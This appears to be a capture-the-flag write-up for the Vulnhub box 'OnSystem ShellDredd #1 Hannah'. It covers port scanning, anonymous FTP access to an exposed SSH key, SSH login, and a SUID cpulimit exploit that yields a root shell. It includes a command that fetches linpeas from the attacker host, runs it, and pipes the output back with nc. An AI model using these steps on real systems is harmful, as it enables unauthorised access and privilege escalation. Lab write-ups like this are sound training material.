---
title: OnSystem ShellDredd #1 Hannah
author: am-a-circle
date: 2021-04-15 12:00:00 +0800
categories: [OSCP PG Play]
tags: [SUID,easy]
math: false
mermaid: false
---


## Overview

"ONSYSTEM: SHELLDREDD #1 HANNAH" is an easy boxes which is great for beginners to learn more about enumerating the poorly configured FTP port to search for sensitive information and escalate to root by exploiting SUID.

|Box Difficulty| Link|
|--|--|
| Easy | [Vulnhub Link](https://www.vulnhub.com/entry/onsystem-shelldredd-1-hannah,545/) |

For this box I will be attempting it on Offensive security **PG Play** .

## Recon

I always like to start with Masscan to find all open port followed by nmap enumeration.
```bash
masscan -p1-65535 192.168.109.130 --rate=1000 
Discovered open port 21/tcp on 192.168.109.130   
Discovered open port 61000/tcp on 192.168.109.130                              
```


```bash
# Nmap 7.91 scan initiated Sun Apr 11 03:44:50 2021 as: nmap -sV -sC -p 21,61000 -oN /opt/OSCP_PlayG/OnSystemShellDredd/nmap_full.txt 192.168.109.130
Nmap scan report for 192.168.109.130
Host is up (0.25s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.109
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)
|   256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)
|_  256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 11 03:45:01 2021 -- 1 IP address (1 host up) scanned in 11.80 seconds

```

Through this we can see that there is a FTP server on port 21 and a SSH at port 61000.

## FTP - TCP 21

We can see that anonymous login is allowed, let's test it:
```bash
# ftp 192.168.109.130
Connected to 192.168.109.130.
220 (vsFTPd 3.0.3)
Name (192.168.109.130:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Next , let's download all the files from the FTP server so we can look through the files :

```bash
 wget -m --no-passive ftp://anonymous:anonymous@192.168.109.130                                                                                                         
--2021-04-13 03:05:02--  ftp://anonymous:*password*@192.168.109.130/                                                                                                       
           => ‘192.168.109.130/.listing’                                                                                                                                   
Connecting to 192.168.109.130:21... connected.                                                                                                                             
Logging in as anonymous ... Logged in!                                                                                                                                    
==> SYST ... done.    ==> PWD ... done.                                                                                                                                   
==> TYPE I ... done.  ==> CWD not needed.                                                                                                                                 
==> PORT ... done.    ==> LIST ... done.       
```

```bash
┌──(root💀kali)-[/opt/OSCP_PlayG/OnSystemShellDredd/192.168.109.130]
└─# ls -laR
.:
total 16
drwxr-xr-x 3 root root 4096 Apr 11 03:52 .
drwxr-xr-x 4 root root 4096 Apr 13 03:05 ..
drwxr-xr-x 2 root root 4096 Apr 11 03:52 .hannah
-rw-r--r-- 1 root root  184 Apr 11 03:52 .listing

./.hannah:
total 16
drwxr-xr-x 2 root root 4096 Apr 11 03:52 .
drwxr-xr-x 3 root root 4096 Apr 11 03:52 ..
-r-------- 1 root root 1823 Aug  6  2020 id_rsa
-rw-r--r-- 1 root root  183 Apr 11 03:52 .listing

```

Great we can see that under the user folder .hannah , there is a id_rsa key. 

```bash
└─# cat id_rsa                     
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
....
HvHD9hkCPIq7Sc/TAAAADXJvb3RAT2ZmU2hlbGwBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----

```

Looking into the content of the file, we can see that this is a OPENSSH PRIVATE KEY, and can use this to ssh into the system as hannah most probably!


## Shell as Hannah

We can see below that if we try to ssh as hannah using the private key,it is ignored as the permission are too open.
```bash
─# ssh -i .hannah/id_rsa hannah@192.168.91.130 -p 61000         
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for '.hannah/id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key ".hannah/id_rsa": bad permissions
hannah@192.168.91.130's password: 
```

Instead we have to ensure that the key is read-writeable by you only before we can ssh as hannah!
```bash
# chmod 600 .hannah/id_rsa 
# ssh -i .hannah/id_rsa hannah@192.168.91.130 -p 61000
Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
hannah@ShellDredd:~$ 
```

With that we are now in the shell as hannah!

## Shell as Root

One of the first things i like to do is run `linpeas.sh`
```bash
#Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out # On Host 
curl HOST-IP:8000/linpeas.sh | sh | nc HOST-IP 9002 #On Victim
```

After running `linpeash.sh` we can see that there is a cpulimit has a SUID permission which we can exploit. This mean we can run cpulimit command as root.
```bash
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════                                                                             
[+] SUID - Check easy privesc, exploits and write perms                                                                                                                   
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                             
strings Not Found                                                                                                                                                         
strace Not Found                                                                                                                                                          
-rwsr-sr-x 1 root root       120K Mar 23  2012 /usr/bin/mawk                                                                                                              
-rwsr-xr-x 1 root root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device                                                                                          
-rwsr-sr-x 1 root root        23K Jun 23  2017 /usr/bin/cpulimit             
```

Thus to gain root privileges , we use cpulimit to copy bash into the temp directory, give it a "chmod +s" so that it maintains root privileges from suid.
```bash
hannah@ShellDredd:~$ cpulimit -l 50 -f cp /bin/bash /tmp/bash
Process 1165 detected
Child process is finished, exiting...
hannah@ShellDredd:~$ cpulimit -l 50 -f chmod +s /tmp/bash
Process 1167 detected
Child process is finished, exiting...
hannah@ShellDredd:~$ /tmp/bash -p
bash-5.0# whoami
root
bash-5.0# id
uid=1000(hannah) gid=1000(hannah) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(hannah)

```

And we are root!
